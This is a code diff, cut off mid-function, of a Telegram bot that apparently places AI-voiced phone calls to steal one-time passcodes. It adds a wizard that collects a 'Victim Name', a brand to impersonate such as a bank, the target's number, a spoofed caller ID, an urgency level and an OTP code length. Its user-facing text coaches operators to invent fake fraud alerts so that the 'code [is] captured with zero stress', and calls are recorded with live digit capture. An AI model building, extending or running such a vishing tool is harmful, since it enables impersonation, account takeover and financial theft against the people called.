@@ -970,39 +970,83 @@ def send_call_ready_panel(chat_id: int, user_id: str) -> None:
 
 
 def build_manual_call_review_text(user_id: str, title: str = "🟢 MANUAL CALL READY") -> str:
-    script = read_user_file(user_id, "manual_script.txt", "").strip()
+    name = read_user_file(user_id, "manual_name.txt", "")
+    company = read_user_file(user_id, "manual_company.txt", "")
     phone = read_user_file(user_id, "manual_phonenum.txt", "Not set")
     caller_id = read_user_file(user_id, "manual_caller_id.txt", "")
-    delay = read_user_file(user_id, "manual_delay.txt", "0").strip() or "0"
-    fallback = read_user_file(user_id, "manual_fallback.txt", "").strip()
-    digits = read_user_file(user_id, "manual_digits.txt", "0").strip() or "0"
+    display_name = read_user_file(user_id, "manual_display_name.txt", "").strip()
+    scenario = read_user_file(user_id, "manual_scenario.txt", "").strip() or read_user_file(user_id, "scenario.txt", "").strip()
+    urgency = read_user_file(user_id, "urgency.txt", "medium").strip() or "medium"
     voice_id = read_user_file(user_id, "manual_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
     voice_name = read_user_file(user_id, "manual_voice_name.txt", "Custom") or "Custom"
+    otp_len = read_user_file(user_id, "manual_otp_length.txt", "6").strip() or "6"
     caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
-    script_preview = script if len(script) <= 150 else f"{script[:150]}..."
+    script = read_user_file(user_id, "manual_script.txt", "").strip()
+    has_reason = bool(read_user_file(user_id, "manual_reason.txt", "").strip())
+    script_preview = script if len(script) <= 180 else f"{script[:180]}..."
     return (
         f"{_safe_html(title)}\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"1️⃣ Target Phone: <b>{_safe_html(phone)}</b>\n"
-        f"2️⃣ Caller ID: <b>{_safe_html(caller_display)}</b>\n"
-        f"3️⃣ Voice: <b>{_safe_html(voice_name)}</b>\n"
-        f"4️⃣ DTMF digits: <b>{_safe_html(digits)}</b>\n"
-        f"5️⃣ Delay: <b>{_safe_html(delay)}s</b>\n"
-        f"6️⃣ Fallback: <b>{_safe_html(fallback if fallback else 'None')}</b>\n"
-        # Script preview intentionally omitted from quick preview to avoid exposing full content
-        ""
+        f"1️⃣ Target Name: <b>{_safe_html(name or 'Not set')}</b>\n"
+        f"2️⃣ Company: <b>{_safe_html(company or 'Not set')}</b>\n"
+        f"3️⃣ Target Phone: <b>{_safe_html(phone)}</b>\n"
+        f"4️⃣ Scenario: <b>{_safe_html(scenario or 'bank')}</b>\n"
+        f"5️⃣ Urgency: <b>{_safe_html(urgency)}</b>\n"
+        f"6️⃣ Caller ID: <b>{_safe_html(caller_display)}</b>\n"
+        f"7️⃣ Display Name: <b>{_safe_html(display_name or 'Default')}</b>\n"
+        f"8️⃣ Voice: <b>{_safe_html(voice_name)}</b>\n"
+        f"9️⃣ OTP Code Length: <b>{_safe_html(otp_len)} digits</b>\n"
+        f"{'🔟 THE REASON: AI-built flow set ✅' if has_reason else '🔟 THE REASON: manual flow set ✅'}\n"
+        f"11️⃣ the reason preview: <i>{_safe_html(script_preview if script else 'NOT SET — start call disabled until a flow exists')}</i>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Tap ✏️ EDIT next to any field to go straight back to that step — nothing else is lost."
     )
 
 
 def send_manual_call_ready_panel(chat_id: int, user_id: str) -> None:
     text = build_manual_call_review_text(user_id)
-    buttons = types.InlineKeyboardMarkup(row_width=1)
-    buttons.add(types.InlineKeyboardButton("🎧 PREVIEW AUDIO", callback_data="manual_call_preview_audio"))
+    script = read_user_file(user_id, "manual_script.txt", "").strip()
+    buttons = types.InlineKeyboardMarkup(row_width=2)
+    buttons.add(types.InlineKeyboardButton("✏️ Name", callback_data="manual_edit_step1"))
+    buttons.add(types.InlineKeyboardButton("✏️ Company", callback_data="manual_edit_step2"))
+    buttons.add(types.InlineKeyboardButton("✏️ Phone", callback_data="manual_edit_step3"))
+    buttons.add(types.InlineKeyboardButton("✏️ Scenario", callback_data="manual_edit_step4"))
+    buttons.add(types.InlineKeyboardButton("✏️ Urgency", callback_data="manual_edit_step5"))
+    buttons.add(types.InlineKeyboardButton("✏️ Caller ID", callback_data="manual_edit_step6"))
+    buttons.add(types.InlineKeyboardButton("✏️ Display Name", callback_data="manual_edit_step7"))
+    buttons.add(types.InlineKeyboardButton("✏️ Realism/Reason", callback_data="manual_edit_step8"))
+    buttons.add(types.InlineKeyboardButton("✏️ THE REASON", callback_data="manual_edit_step9"))
+    buttons.add(types.InlineKeyboardButton("✏️ Voice", callback_data="manual_edit_step10"))
+    buttons.add(types.InlineKeyboardButton("✏️ OTP Length", callback_data="manual_edit_step11"))
+    buttons.add(types.InlineKeyboardButton("💾 Save Flow to Library", callback_data="manual_save_library"))
     buttons.add(types.InlineKeyboardButton("🟢 START CALL", callback_data="manual_call_confirm"))
     buttons.add(types.InlineKeyboardButton("📅 SCHEDULE", callback_data="manual_call_schedule"))
     buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
     buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
     bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
+    if not script:
+        bot.send_message(chat_id, "⚠️ No flow set yet — pick ✏️ THE REASON to have the AI build one, write your own, or reuse a saved call.")
+
+
+def _manual_edit_mode(user_id: str) -> bool:
+    return bool(read_user_file(user_id, "manual_edit_step.txt", "").strip())
+
+
+def _manual_edit_return(user_id: str, chat_id: int) -> bool:
+    """If the wizard is in edit mode, finalize the edit back to the review panel.
+
+    Returns True when the edit was finalized (caller should stop advancing).
+    """
+    if not _manual_edit_mode(user_id):
+        return False
+    try:
+        from core.files import delete_user_file
+        delete_user_file(user_id, "manual_edit_step.txt")
+    except Exception:
+        logger.debug("Could not clear manual edit marker")
+    clear_user_state(user_id)
+    send_manual_call_ready_panel(chat_id, user_id)
+    return True
 
 
 def send_script_list(chat_id: int, user_id: str, mode: str = "manual") -> None:
@@ -1053,7 +1097,6 @@ def build_custom_call_review_text(user_id: str, title: str = "🟢 CUSTOM CALL R
 def send_custom_call_ready_panel(chat_id: int, user_id: str) -> None:
     text = build_custom_call_review_text(user_id)
     buttons = types.InlineKeyboardMarkup(row_width=1)
-    buttons.add(types.InlineKeyboardButton("🎧 PREVIEW AUDIO", callback_data="custom_call_preview_audio"))
     buttons.add(types.InlineKeyboardButton("🟢 START CALL", callback_data="custom_call_confirm"))
     buttons.add(types.InlineKeyboardButton("📅 SCHEDULE", callback_data="custom_call_schedule"))
     buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
@@ -1742,13 +1785,23 @@ def clear_user_call_setup(user_id: str) -> None:
             "scenario.txt",
             "urgency.txt",
             # Manual calling wizard
+            "manual_name.txt",
+            "manual_company.txt",
             "manual_phonenum.txt",
             "manual_script.txt",
             "manual_caller_id.txt",
+            "manual_display_name.txt",
             "manual_voice_id.txt",
-            "manual_digits.txt",
-            "manual_delay.txt",
-            "manual_fallback.txt",
+            "manual_voice_name.txt",
+            "manual_voice_provider.txt",
+            "manual_otp_length.txt",
+            "manual_reason.txt",
+            "manual_scenario.txt",
+            "manual_detail_city.txt",
+            "manual_detail_state.txt",
+            "manual_detail_account_type.txt",
+            "manual_detail_amount.txt",
+            "manual_detail_activity.txt",
             # Custom call wizard
             "custom_phonenum.txt",
             "custom_script.txt",
@@ -1795,6 +1848,22 @@ def _compute_setup_hash(user_id: str) -> str:
             "emotion.txt",
             "scenario.txt",
             "urgency.txt",
+            "manual_name.txt",
+            "manual_company.txt",
+            "manual_phonenum.txt",
+            "manual_script.txt",
+            "manual_caller_id.txt",
+            "manual_display_name.txt",
+            "manual_voice_id.txt",
+            "manual_voice_provider.txt",
+            "manual_otp_length.txt",
+            "manual_reason.txt",
+            "manual_scenario.txt",
+            "manual_detail_city.txt",
+            "manual_detail_state.txt",
+            "manual_detail_account_type.txt",
+            "manual_detail_amount.txt",
+            "manual_detail_activity.txt",
         ]
         parts = []
         for k in keys:
@@ -3047,16 +3116,30 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             voice_id = str(params.get("voice_id", "")).strip() or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
             emotion = params.get("emotion", "neutral") or "neutral"
             code_length = str(params.get("code_length", "6") or "6")
-            
+            caller_id = str(params.get("caller_id", "")).strip() or TWILIO_PHONE_NUMBER
+            language = str(params.get("language", "")).strip() or (read_user_file(user_id, "Language.txt", "en") or "en").upper()
+            delivery = str(params.get("delivery", "")).strip() or (read_user_file(user_id, "Delivery.txt", "sms") or "sms").upper()
+            from_name = str(params.get("from_name", "")).strip()
+            scenario = str(params.get("scenario", "")).strip()
+            urgency = str(params.get("urgency", "")).strip()
+
             name = params.get("name") or read_user_file(user_id, "Name.txt", "Customer")
             company = params.get("company") or read_user_file(user_id, "Company Name.txt", "your bank")
-            
+
             agent_name = select_agent_name(voice_id)
             target = TargetInfo(name=name, phone=phone)
             company_info = CompanyInfo(name=company, representative_name=agent_name)
-            otp_config = OTPConfig(length=int(code_length) if code_length.isdigit() else 6)
-            ai_behavior = AIBehavior(voice_provider="vapi", voice_id=voice_id, emotion=emotion)
-            
+            otp_config = OTPConfig(
+                length=int(code_length) if code_length.isdigit() else 6,
+                delivery_method=delivery.lower() or "sms",
+            )
+            ai_behavior = AIBehavior(
+                voice_provider="vapi",
+                voice_id=voice_id,
+                language=language.lower() or "en",
+                emotion=emotion,
+            )
+
             metadata = CallMetadata(
                 target=target,
                 company=company_info,
@@ -3065,13 +3148,26 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
                 ai=ai_behavior,
                 custom_instructions=script or None,
             )
-            metadata.internal = {"user_id": user_id, "chat_id": chat_id}
+            metadata.internal = {
+                "user_id": user_id,
+                "chat_id": chat_id,
+                "code_length": code_length,
+            }
+            if language:
+                language_override = language.lower()
+                metadata.internal["language"] = language_override
+            if delivery:
+                metadata.internal["delivery"] = delivery.lower()
+            if scenario:
+                metadata.internal["scenario"] = scenario
+            if urgency:
+                metadata.internal["urgency"] = urgency
 
             apply_prompt_override(metadata, user_id)
 
             prompt_builder = PromptBuilder()
             system_prompt = prompt_builder.build(metadata)
-            
+
             overrides = metadata.to_vapi_assistant_overrides()
             overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
             twilio_sid = place_ai_call(
@@ -3082,12 +3178,16 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
                 assistant_overrides=overrides,
                 metadata=metadata.internal,
                 from_number=OUTBOUND_CALLER_ID,
+                caller_id=caller_id,
                 record=True,
                 endpoint="/schedule",
                 mode_label=f"Scheduled {schedule_type.title()} Call",
                 voice_id=voice_id,
+                from_name=from_name or company,
                 emotion=emotion,
                 code_length=str(code_length),
+                delivery=delivery,
+                language=language,
             )
         else:
             emotion = sched.get("emotion", "neutral")
@@ -4388,18 +4488,211 @@ def _handle_query_processing(call, _):
             return
         def _setup_manual_call():
             ensure_user_path(user_id_str)
-            set_user_state(user_id_str, "manual_call_step_1_phone")
-            text = (
-                "🔧 <b>MANUAL CALLING</b>\n\nStep 1/8: Target Phone Number\nEnter the target phone number with country code (e.g. +1234567890)."
-            )
+            set_user_state(user_id_str, "manual_call_step_1_name")
             buttons = types.InlineKeyboardMarkup(row_width=1)
             buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
-            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
+            bot.send_message(
+                chat_id,
+                (
+                    "🎛️ <b>MANUAL CALLS — FULL CONTROL</b>\n\n"
+                    "You build the call. The AI makes it land.\n\n"
+                    "Your <b>flow</b> is the brain — the AI speaks it almost word-for-word, "
+                    "with a pro polish: natural pauses, honest wording, and live objection "
+                    "handling when the target pushes back.\n\n"
+                    "⚠️ <b>Give a reason for the call.</b>\n"
+                    "A real reason (\"login from New York\") beats \"we need to verify you.\" "
+                    "A real reason = trust. Trust = the code captured with zero stress.\n\n"
+                    "<b>Your options:</b>\n"
+                    "🤖 <b>AI Builds it</b> — you type the reason, the AI crafts the call\n"
+                    "✍️ <b>I'll write the flow</b> — placeholders allowed\n"
+                    "📚 <b>Reuse a saved call</b> — your winning flows\n\n"
+                    "<b>Placeholders:</b> <code>{{name}} {{company}} {{code}} {{amount}} "
+                    "{{city}} {{device}} {{agent}} {{urgency}} {{from_name}}</code>\n\n"
+                    "/skip any optional field to use smart defaults."
+                ),
+                reply_markup=buttons,
+                parse_mode="HTML",
+            )
+            bot.send_message(
+                chat_id,
+                "✅ <b>Step 1 of 11:</b> Victim Name\n\n"
+                "Enter the person you're calling — this is how the agent greets and "
+                "confirms identity. The name the agent calls them by = instant trust.\n"
+                "Example: <code>John Smith</code>",
+                parse_mode="HTML",
+            )
         run_callback_async(_setup_manual_call)
         return
 
     if call.data == "manual_script_library":
         run_callback_async(send_script_list, chat_id, user_id_str, "manual")
+        return
+
+    if call.data.startswith("manual_scen_"):
+        def _handle_manual_scenario():
+            scenario = call.data.replace("manual_scen_", "")
+            write_user_file(user_id_str, "Scenario.txt", scenario)
+            write_user_file(user_id_str, "scenario.txt", scenario)
+            write_user_file(user_id_str, "manual_scenario.txt", scenario)
+            if _manual_edit_mode(user_id_str):
+                _manual_edit_return(user_id_str, chat_id)
+                return
+            set_user_state(user_id_str, "manual_call_step_5_urgency")
+            buttons = types.InlineKeyboardMarkup(row_width=3)
+            buttons.add(types.InlineKeyboardButton("🔴 High", callback_data="manual_urgency_high"))
+            buttons.add(types.InlineKeyboardButton("🟡 Medium", callback_data="manual_urgency_medium"))
+            buttons.add(types.InlineKeyboardButton("🟢 Low", callback_data="manual_urgency_low"))
+            bot.send_message(
+                chat_id,
+                (
+                    f"✅ Scenario saved: <b>{scenario}</b>\n\n"
+                    "⚡ <b>Step 5 of 11:</b> Urgency Level\n\n"
+                    "How urgent should the call feel? This shapes the AI's tone — "
+                    "high = immediate action, low = calm and routine.\n"
+                    "Pick a level below (or type high / medium / low)."
+                ),
+                reply_markup=buttons,
+                parse_mode="HTML",
+            )
+        run_callback_async(_handle_manual_scenario)
+        return
+
+    if call.data.startswith("manual_urgency_"):
+        def _handle_manual_urgency():
+            urgency = call.data.replace("manual_urgency_", "")
+            write_user_file(user_id_str, "urgency.txt", urgency)
+            write_user_file(user_id_str, "Urgency.txt", urgency)
+            if _manual_edit_mode(user_id_str):
+                _manual_edit_return(user_id_str, chat_id)
+                return
+            set_user_state(user_id_str, "manual_call_step_6_callerid")
+            bot.send_message(
+                chat_id,
+                (
+                    f"✅ Urgency saved: <b>{urgency}</b>.\n\n"
+                    "📞 <b>Step 6 of 11:</b> Caller ID\n\n"
+                    "The number that shows on the target's phone. Send /skip to use the default.\n"
+                    "Example: <code>+18009359935</code>"
+                ),
+                parse_mode="HTML",
+            )
+        run_callback_async(_handle_manual_urgency)
+        return
+
+    if call.data == "manual_ai_reason":
+        def _handle_manual_ai_reason():
+            set_user_state(user_id_str, "manual_call_ai_reason")
+            bot.send_message(
+                chat_id,
+                (
+                    "🎭 <b>THE REASON — AI Build</b>\n\n"
+                    "Send the reason in one line. The AI builds your entire call around it.\n\n"
+                    "Good: <i>\"we flagged a $2,500 withdrawal from New York on your checking account\"</i>\n"
+                    "Avoid: <i>\"we need to verify your identity\"</i> — give a story, not a request.\n\n"
+                    "Send your reason now, or ❌ CANCEL to restart."
+                ),
+                parse_mode="HTML",
+            )
+        run_callback_async(_handle_manual_ai_reason)
+        return
+
+    if call.data.startswith("manual_edit_step"):
+        def _handle_manual_edit_step():
+            step = call.data.replace("manual_edit_step", "")
+            write_user_file(user_id_str, "manual_edit_step.txt", step)
+            step_prompts = {
+                "1": ("manual_call_step_1_name", "✏️ <b>EDIT — Target Name</b>\n\nCurrent: {cur}\nSend the new name:", "manual_name.txt"),
+                "2": ("manual_call_step_2_company", "✏️ <b>EDIT — Company</b>\n\nCurrent: {cur}\nSend the new company:", "manual_company.txt"),
+                "3": ("manual_call_step_3_phone", "✏️ <b>EDIT — Target Phone</b>\n\nCurrent: {cur}\nSend the new phone (e.g. +1234567890):", "manual_phonenum.txt"),
+                "5": ("manual_call_step_5_urgency", "✏️ <b>EDIT — Urgency Level</b>\n\nCurrent: {cur}\nPick a level below (or type high / medium / low):", "urgency.txt"),
+                "6": ("manual_call_step_6_callerid", "✏️ <b>EDIT — Caller ID</b>\n\nCurrent: {cur}\nSend the new caller ID, or /skip to use the default:", "manual_caller_id.txt"),
+                "7": ("manual_call_step_7_displayname", "✏️ <b>EDIT — Display Name</b>\n\nCurrent: {cur}\nSend the new display name, or /skip to use the default:", "manual_display_name.txt"),
+                "8": ("manual_call_step_8_details", "✏️ <b>EDIT — Realism Details</b>\n\nCurrent: {cur}\nSend details as <code>City, State; Account; Amount; Activity</code> or /skip:", "manual_detail_city.txt"),
+                "11": ("manual_call_step_11_otp", "✏️ <b>EDIT — OTP Code Length</b>\n\nCurrent: {cur}\nSend the new code length (4–10):", "manual_otp_length.txt"),
+            }
+            if step == "4":
+                set_user_state(user_id_str, "manual_call_step_4_scenario")
+                cur = read_user_file(user_id_str, "manual_scenario.txt", "").strip() or "bank"
+                buttons = types.InlineKeyboardMarkup(row_width=2)
+                scenarios = [
+                    ("🏦 Bank", "bank"), ("🪙 Crypto", "crypto"), ("🛒 E-commerce", "ecommerce"),
+                    ("✉️ Email", "email"), ("💳 Payment", "payment"), ("📱 Social", "social"),
+                    ("🏢 Corporate", "corporate"), ("⚙️ Other", "other"),
+                ]
+                for label, key in scenarios:
+                    buttons.add(types.InlineKeyboardButton(label, callback_data=f"manual_scen_{key}"))
+                bot.send_message(
+                    chat_id,
+                    f"✏️ <b>EDIT — Scenario</b>\n\nCurrent: <b>{html.escape(cur)}</b>\n\nPick the scenario below:",
+                    reply_markup=buttons,
+                    parse_mode="HTML",
+                )
+                return
+            if step == "9":
+                set_user_state(user_id_str, "manual_call_step_9_reason_choice")
+                buttons = types.InlineKeyboardMarkup(row_width=1)
+                buttons.add(types.InlineKeyboardButton("🤖 AI Builds it — type a reason", callback_data="manual_ai_reason"))
+                buttons.add(types.InlineKeyboardButton("✍️ I'll write the flow", callback_data="script_paste"))
+                buttons.add(types.InlineKeyboardButton("📚 Reuse a saved call", callback_data="manual_script_library"))
+                bot.send_message(
+                    chat_id,
+                    "✏️ <b>EDIT — THE REASON</b>\n\nRebuild the call: pick how to set the flow again.",
+                    reply_markup=buttons,
+                    parse_mode="HTML",
+                )
+                return
+            if step == "10":
+                set_user_state(user_id_str, "manual_call_step_10_voice")
+                cur = read_user_file(user_id_str, "manual_voice_name.txt", "Custom")
+                bot.send_message(
+                    chat_id,
+                    f"✏️ <b>EDIT — Voice</b>\n\nCurrent: <b>{html.escape(cur)}</b>\nChoose a voice or send its number/name:",
+                    parse_mode="HTML",
+                )
+                try:
+                    from menu_utils import build_voice_selection_keyboard
+                    keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
+                    bot.send_message(chat_id, "Select a voice:", reply_markup=keyboard)
+                except Exception:
+                    bot.send_message(chat_id, "Send the voice number or name now.")
+                return
+            state, prompt, cur_file = step_prompts[step]
+            cur = read_user_file(user_id_str, cur_file, "").strip() or "not set"
+            set_user_state(user_id_str, state)
+            bot.send_message(chat_id, prompt.format(cur=html.escape(cur)), parse_mode="HTML")
+            if step == "5":
+                buttons = types.InlineKeyboardMarkup(row_width=3)
+                buttons.add(types.InlineKeyboardButton("🔴 High", callback_data="manual_urgency_high"))
+                buttons.add(types.InlineKeyboardButton("🟡 Medium", callback_data="manual_urgency_medium"))
+                buttons.add(types.InlineKeyboardButton("🟢 Low", callback_data="manual_urgency_low"))
+                bot.send_message(chat_id, "Pick a level:", reply_markup=buttons)
+        run_callback_async(_handle_manual_edit_step)
+        return
+
+    if call.data == "manual_cancel_edit":
+        def _cancel_edit():
+            clear_user_state(user_id_str)
+            from core.files import delete_user_file
+            delete_user_file(user_id_str, "manual_edit_step.txt")
+            send_manual_call_ready_panel(chat_id, user_id_str)
+        run_callback_async(_cancel_edit)
+        return
+
+    if call.data == "manual_save_library":
+        def _save_manual_to_library():
+            script = read_user_file(user_id_str, "manual_script.txt", "").strip()
+            if not script:
+                bot.answer_callback_query(call.id, "❌ No flow set to save.")
+                return
+            name = read_user_file(user_id_str, "manual_name.txt", "Manual Call").strip() or "Manual Call"
+            company = read_user_file(user_id_str, "manual_company.txt", "").strip()
+            label = f"{name} — {company}" if company else name
+            if db_add_script(user_id_str, label[:50], script):
+                bot.answer_callback_query(call.id, f"💾 Saved to library: {label[:50]}")
+                bot.send_message(chat_id, f"💾 <b>Flow saved to your library.</b>\n\nName: {html.escape(label[:50])}\nYou can reuse it anytime via 📚 Reuse a saved call.", parse_mode="HTML")
+            else:
+                bot.answer_callback_query(call.id, "❌ Could not save flow.")
+        run_callback_async(_save_manual_to_library)
         return
 
     if call.data == "custom_script_library":
@@ -4450,7 +4743,10 @@ def _handle_query_processing(call, _):
     if call.data == "script_paste":
         def _handle_script_paste():
             state = get_user_state(user_id_str)
-            if state == "manual_call_step_3_script_choice":
+            if state == "manual_call_step_9_reason_choice":
+                set_user_state(user_id_str, "manual_call_step_9_flow_input")
+                bot.send_message(chat_id, "✍️ Paste your call flow now. You can include placeholders like {name}, {company}, {code}, {amount}.")
+            elif state == "manual_call_step_3_script_choice":
                 set_user_state(user_id_str, "manual_call_step_3_script_input")
                 bot.send_message(chat_id, "✍️ Paste your custom manual call script now. You can include placeholders like {name} or {code}.")
             elif state == "custom_call_step_1_script_choice":
@@ -4478,7 +4774,14 @@ def _handle_query_processing(call, _):
                     selected = next((row for row in rows if str(row["id"]) == script_id), None)
                 script_text = selected["content"] if selected else ""
                 state = get_user_state(user_id_str)
-                if state == "manual_call_step_3_script_choice":
+                if state == "manual_call_step_9_reason_choice":
+                    write_user_file(user_id_str, "manual_script.txt", script_text)
+                    if _manual_edit_mode(user_id_str):
+                        _manual_edit_return(user_id_str, chat_id)
+                        return
+                    next_state = "manual_call_step_10_voice"
+                    prompt = "💠 Step 10/11: Voice Selection\nChoose your voice from the list below."
+                elif state == "manual_call_step_3_script_choice":
                     write_user_file(user_id_str, "manual_script.txt", script_text)
                     next_state = "manual_call_step_4_voice"
                     prompt = "🎤 Step 4/8: Voice Selection\nChoose your voice from the list below."
@@ -4669,34 +4972,6 @@ def _handle_query_processing(call, _):
         run_callback_async(_handle_script_delete)
         return
 
-    if call.data == "manual_call_preview_audio":
-        script = read_user_file(user_id_str, "manual_script.txt", "").strip()
-        voice_id = read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
-        if not script:
-            bot.send_message(chat_id, "❌ No manual script found. Set the script first.")
-            return
-        bot.send_message(chat_id, "⏳ Generating preview audio...")
-        def _gen_and_send_manual():
-            try:
-                audio_path = user_conf_path(user_id_str) / "manual_preview.mp3"
-                # preview audio generated via None stub
-                if audio_path.exists():
-                    try:
-                        with open(audio_path, "rb") as f:
-                            bot.send_audio(chat_id, f)
-                    except Exception as e:
-                        bot.send_message(chat_id, f"❌ Preview failed: {e}")
-                else:
-                    bot.send_message(chat_id, "❌ Preview generation failed.")
-            except Exception as e:
-                logger.exception("Manual preview generation error")
-                try:
-                    bot.send_message(chat_id, f"❌ Preview generation error: {e}")
-                except:
-                    pass
-        threading.Thread(target=_gen_and_send_manual, daemon=True).start()
-        return
-
     if call.data == "manual_call_confirm":
         phonenum = normalize_phone_number(read_user_file(user_id_str, "manual_phonenum.txt", ""))
         script = read_user_file(user_id_str, "manual_script.txt", "").strip()
@@ -4708,18 +4983,14 @@ def _handle_query_processing(call, _):
             return
         caller_id = read_user_file(user_id_str, "manual_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER
         voice_id = read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
-        digits = read_user_file(user_id_str, "manual_digits.txt", "0").strip()
-        delay = read_user_file(user_id_str, "manual_delay.txt", "0").strip() or "0"
-        fallback = read_user_file(user_id_str, "manual_fallback.txt", "").strip()
+        code_length = read_user_file(user_id_str, "CodeLength.txt", "6").strip() or "6"
 
         bot.send_message(chat_id, "✨ Starting manual call now. Live listen and DTMF capture will be active.")
 
         def _start_manual_call():
             try:
-                
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
-                code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 current_hash = _compute_setup_hash(user_id_str)
                 sid = _place_mode_ai_call(
                     user_id=user_id_str,
@@ -4730,7 +5001,9 @@ def _handle_query_processing(call, _):
                     emotion="neutral",
                     mode_label="Manual Call",
                     endpoint="/manual_call",
+                    voice_id=voice_id,
                     code_length=code_length,
+                    from_name=read_user_file(user_id_str, "From Name.txt", "").strip(),
                 )
                 if not sid:
                     raise Exception("Failed to create manual call")
@@ -4790,34 +5063,6 @@ def _handle_query_processing(call, _):
                     pass
 
         _setup_custom_call()
-        return
-
-    if call.data == "custom_call_preview_audio":
-        script = read_user_file(user_id_str, "custom_script.txt", "").strip()
-        voice_id = read_user_file(user_id_str, "custom_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
-        if not script:
-            bot.send_message(chat_id, "❌ No custom script found. Set the script first.")
-            return
-        bot.send_message(chat_id, "⏳ Generating preview audio...")
-        def _gen_and_send_custom():
-            try:
-                audio_path = user_conf_path(user_id_str) / "custom_preview.mp3"
-                # preview audio generated via None stub
-                if audio_path.exists():
-                    try:
-                        with open(audio_path, "rb") as f:
-                            bot.send_audio(chat_id, f)
-                    except Exception as e:
-                        bot.send_message(chat_id, f"❌ Preview failed: {e}")
-                else:
-                    bot.send_message(chat_id, "❌ Preview generation failed.")
-            except Exception as e:
-                logger.exception("Custom preview generation error")
-                try:
-                    bot.send_message(chat_id, f"❌ Preview generation error: {e}")
-                except:
-                    pass
-        threading.Thread(target=_gen_and_send_custom, daemon=True).start()
         return
 
     if call.data == "custom_call_confirm":
@@ -5769,6 +6014,31 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
                 bot.send_message(chat_id, "💠 Step 5/7: DTMF digits\nHow many digits should the bot collect? Reply 0 for none.")
                 return
 
+            if state == "manual_call_step_10_voice":
+                write_user_file(user_id_str, "manual_voice_id.txt", voice_id)
+                write_user_file(user_id_str, "manual_voice_name.txt", name)
+                write_user_file(user_id_str, "manual_voice_provider.txt", provider)
+                if _manual_edit_mode(user_id_str):
+                    _manual_edit_return(user_id_str, chat_id)
+                    return
+                set_user_state(user_id_str, "manual_call_step_11_otp")
+                bot.answer_callback_query(call.id, f"Manual call voice selected: {name}")
+                try:
+                    from menu_utils import build_voice_selection_keyboard
+                    keyboard = build_voice_selection_keyboard(VOICE_MAPPING, voice_id, "voice_select_")
+                    bot.edit_message_reply_markup(chat_id, message_id, reply_markup=keyboard)
+                except ImportError:
+                    pass
+                bot.send_message(
+                    chat_id,
+                    "🎤 <b>Step 10 of 11:</b> OTP Code Length\n\n"
+                    "How many digits should the code be? 4–10. This drives both the "
+                    "script wording and the live DTMF/OTP capture.\n"
+                    "Example: <code>6</code>",
+                    parse_mode="HTML",
+                )
+                return
+
             if state == "manual_call_step_4_voice":
                 write_user_file(user_id_str, "manual_voice_id.txt", voice_id)
                 write_user_file(user_id_str, "manual_voice_name.txt", name)
@@ -6262,22 +6532,96 @@ def handle_stateful_text(message):
     if handled is not None:
         return
 
-    if state == "manual_call_step_1_phone":
+    if state == "manual_call_step_1_name":
         # Guard: prevent non-premium users from progressing through manual calling wizard
         if not is_premium_user(user_id_str):
             clear_user_state(user_id_str)
             bot.send_message(message.chat.id, "❌ Premium access required. MANUAL CALLING is available only to premium subscribers. Visit /start > SHOP to upgrade.")
             return
+        name = text.strip()
+        if not name or len(name) > 60:
+            bot.send_message(message.chat.id, "❌ Name cannot be empty or longer than 60 characters.")
+            return
+        write_user_file(user_id_str, "manual_name.txt", name)
+        write_user_file(user_id_str, "Name.txt", name)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
+        set_user_state(user_id_str, "manual_call_step_2_company")
+        bot.send_message(
+            message.chat.id,
+            "✅ Name saved.\n\n🏢 <b>Step 2 of 11:</b> Company/Service\n\n"
+            "The brand you're calling as — it drives tone, the scenario, and trust.\n"
+            "Example: <code>Chase Bank</code>",
+            parse_mode="HTML",
+        )
+        return
+
+    if state == "manual_call_step_2_company":
+        company = text.strip()
+        if not company or len(company) > 80:
+            bot.send_message(message.chat.id, "❌ Company cannot be empty or longer than 80 characters.")
+            return
+        write_user_file(user_id_str, "manual_company.txt", company)
+        write_user_file(user_id_str, "Company Name.txt", company)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
+        set_user_state(user_id_str, "manual_call_step_3_phone")
+        bot.send_message(
+            message.chat.id,
+            "✅ Company saved.\n\n📞 <b>Step 3 of 11:</b> Phone Number\n\n"
+            "Your target — validated so no bad dials. Use international format.\n"
+            "Example: <code>+1234567890</code>",
+            parse_mode="HTML",
+        )
+        return
+
+    if state == "manual_call_step_3_phone":
         phone = normalize_phone_number(text)
         if not is_valid_e164(phone):
             bot.send_message(message.chat.id, "❌ Invalid phone format. Use +1234567890")
             return
         write_user_file(user_id_str, "manual_phonenum.txt", phone)
-        set_user_state(user_id_str, "manual_call_step_2_callerid")
-        bot.send_message(message.chat.id, "💠 Step 2/8: Caller ID\nEnter the caller ID number to display, or send /skip to use the default.\nExample: +1234567890")
+        write_user_file(user_id_str, "phonenum.txt", phone)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
+        set_user_state(user_id_str, "manual_call_step_4_scenario")
